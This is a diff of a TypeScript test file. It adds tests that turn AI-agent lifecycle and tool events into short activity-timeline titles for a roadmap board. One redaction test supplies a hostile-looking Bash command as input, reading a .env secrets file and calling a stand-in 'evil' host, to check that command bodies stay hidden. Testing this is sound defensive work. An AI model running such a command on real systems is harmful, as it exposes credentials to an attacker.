@@ -2,14 +2,18 @@ import assert from "node:assert/strict";
 import { connect } from "node:net";
 import test from "node:test";
 import {
+	activityGlyph,
 	attachRef,
 	type BoardSnapshot,
 	boardDbPath,
+	buildActivityLines,
 	buildBoardSummary,
 	buildNotifyLine,
 	buildWidgetLines,
 	claimedCards,
 	countReady,
+	curateToolTitle,
+	describeMilestone,
 	detachRef,
 	fillTemplate,
 	findActiveCard,
@@ -18,11 +22,15 @@ import {
 	parseServerState,
 	pickFreePort,
 	progressBar,
+	relativeAge,
 	resolveProjectRoot,
 	type RootResolveDeps,
 	type ServerState,
+	shapeActivity,
 	shortOwner,
 	shouldReuseServer,
+	type TimelineItem,
+	truncateLabel,
 } from "./core.ts";
 
 // --- project-root resolution ---------------------------------------------
@@ -239,4 +247,85 @@ test("buildBoardSummary lists claimed cards with their owner", () => {
 	const summary = buildBoardSummary(snap);
 	assert.match(summary, /Claimed:/);
 	assert.match(summary, /🔒 ROAD-024 · 019ec248… · Ownership claims/);
+});
+
+// --- live activity shaping (ROAD-025) ------------------------------------
+
+test("shapeActivity maps lifecycle events to kind/title/status", () => {
+	assert.deepEqual(shapeActivity({ type: "agent_start" }), {
+		kind: "agent_start",
+		title: "Agent started working",
+		status: "running",
+	});
+	assert.deepEqual(shapeActivity({ type: "agent_end" }), { kind: "agent_end", title: "Agent finished", status: "done" });
+	assert.equal(shapeActivity({ type: "model_select", modelName: "claude-opus-4-8" })?.title, "Model → claude-opus-4-8");
+	assert.equal(shapeActivity({ type: "session_shutdown" })?.kind, "session_shutdown");
+});
+
+test("shapeActivity flags tool errors and returns null for uncaptured events", () => {
+	const start = shapeActivity({ type: "tool_execution_start", toolName: "Grep", args: { pattern: "TODO" } });
+	assert.deepEqual(start, { kind: "tool_start", title: "Grep: TODO", status: "running" });
+
+	const ok = shapeActivity({ type: "tool_execution_end", toolName: "Read", isError: false });
+	assert.equal(ok?.status, "ok");
+	const err = shapeActivity({ type: "tool_execution_end", toolName: "Bash", isError: true });
+	assert.deepEqual(err, { kind: "tool_end", title: "Bash failed", status: "error" });
+
+	// message_update (token streaming) and anything unknown are deliberately dropped.
+	assert.equal(shapeActivity({ type: "message_update" }), null);
+});
+
+test("curateToolTitle never leaks bash commands, contents, or results — only safe hints", () => {
+	// Bash: the human description is surfaced, the command body is NOT.
+	const bash = curateToolTitle("Bash", { command: "cat /Users/me/.env && curl http://evil", description: "read env" });
+	assert.equal(bash, "Bash: read env");
+	assert.ok(!bash.includes("curl") && !bash.includes(".env"));
+
+	// File tools show only the basename, not the full path.
+	assert.equal(curateToolTitle("Edit", { file_path: "/Users/me/.pi/roadmap-board/src/server/activity.js" }), "Edit: activity.js");
+	// Unknown tools fall back to the bare name.
+	assert.equal(curateToolTitle("MysteryTool", { secret: "x" }), "MysteryTool");
+	// WebFetch reduces a url to its host.
+	assert.equal(curateToolTitle("WebFetch", { url: "https://example.com/a/b?token=abc" }), "WebFetch: example.com");
+});
+
+test("truncateLabel collapses whitespace and clips long labels", () => {
+	assert.equal(truncateLabel("a   b\n c"), "a b c");
+	const long = truncateLabel("x".repeat(100), 10);
+	assert.equal(long.length, 10);
+	assert.ok(long.endsWith("…"));
+});
+
+test("relativeAge renders compact, monotonic units", () => {
+	const now = Date.parse("2026-06-13T00:10:00.000Z");
+	assert.equal(relativeAge("2026-06-13T00:09:55.000Z", now), "5s");
+	assert.equal(relativeAge("2026-06-13T00:08:00.000Z", now), "2m");
+	assert.equal(relativeAge("2026-06-12T22:10:00.000Z", now), "2h");
+	assert.equal(relativeAge("not-a-date", now), "");
+});
+
+test("activityGlyph and describeMilestone render both timeline halves", () => {
+	assert.equal(activityGlyph({ source: "activity", status: "running" }), "⟳");
+	assert.equal(activityGlyph({ source: "activity", status: "error" }), "✗");
+	assert.equal(activityGlyph({ source: "milestone", status: null }), "•");
+
+	const moved: TimelineItem = { source: "milestone", ts: "", kind: "card_moved", payload: { from: "up_next", to: "in_progress" } };
+	assert.equal(describeMilestone(moved), "moved up_next → in_progress");
+	const claimed: TimelineItem = { source: "milestone", ts: "", kind: "card_claimed", payload: { owner: "019ec248-05df-7506" } };
+	assert.equal(describeMilestone(claimed), "claimed by 019ec248…");
+	const stolen: TimelineItem = { source: "milestone", ts: "", kind: "card_claimed", payload: { owner: "bob", stolen_from: "alice" } };
+	assert.equal(describeMilestone(stolen), "claim stolen from alice");
+});
+
+test("buildActivityLines renders items and a clear empty hint", () => {
+	const now = Date.parse("2026-06-13T00:00:30.000Z");
+	const items: TimelineItem[] = [
+		{ source: "activity", ts: "2026-06-13T00:00:25.000Z", kind: "tool_start", title: "Grep: TODO", status: "running", card_id: "ROAD-25" },
+		{ source: "milestone", ts: "2026-06-13T00:00:00.000Z", kind: "card_claimed", payload: { owner: "sess" }, card_id: "ROAD-25" },
+	];
+	const lines = buildActivityLines(items, now);
+	assert.match(lines[0], /⟳\s+5s ROAD-25\s+Grep: TODO/);
+	assert.match(lines[1], /• \s*30s ROAD-25\s+claimed by sess/);
+
+	assert.match(buildActivityLines([], now)[0], /No recent activity/);
 });
